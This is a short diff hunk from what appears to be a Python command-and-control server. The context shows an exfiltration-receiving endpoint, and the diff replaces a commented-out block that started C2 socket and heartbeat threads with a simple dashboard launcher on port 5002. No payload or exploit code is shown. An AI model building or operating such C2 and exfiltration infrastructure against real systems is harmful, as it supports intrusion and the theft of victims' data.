@@ -905,43 +905,6 @@ def receive_exfil():
         print(f"Error processing exfil: {e}")
         return jsonify({"error": str(e)}), 500
 
-# if __name__ == '__main__':
-#     # Start C2 server in background thread
-#     server_thread = C2ServerThread()
-#     server_thread.start()
-    
-#     # Start heartbeat thread to monitor client health
-#     heartbeat_thread = HeartbeatThread()
-#     heartbeat_thread.start()
-    
-#     try:
-#         # Start Flask web server
-#         print("[*] Starting Flask web interface on http://0.0.0.0:5002")
-#         print(f"[*] Client timeout set to {CLIENT_TIMEOUT} seconds")
-#         print(f"[*] Heartbeat check interval: {HEARTBEAT_INTERVAL} seconds")
-#         socketio.run(app, host='0.0.0.0', port=5002, debug=True, use_reloader=False, allow_unsafe_werkzeug=True)
-#     except KeyboardInterrupt:
-#         print("\n[*] Ctrl+C detected. Server shutting down...")
-        
-#         # Stop the C2 server thread
-#         server_running = False
-        
-#         # Close all client connections
-#         print("[*] Closing client connections...")
-#         for client_id, client_info in list(clients.items()):
-#             try:
-#                 client_info['socket'].close()
-#             except:
-#                 pass
-#         clients.clear()
-        
-#         # Close the C2 server socket
-#         print("[*] Closing C2 server socket (port 5001)...")
-#         if server_socket:
-#             try:
-#                 server_socket.close()
-#             except:
-#                 pass
-        
-#         print("[*] Server shutdown complete. Ports 5001 and 5002 released.")
-#         sys.exit(0)
+if __name__ == '__main__':
+    print("[*] Starting Web Dashboard on http://0.0.0.0:5002")
+    socketio.run(app, host='0.0.0.0', port=5002, debug=False, use_reloader=False)
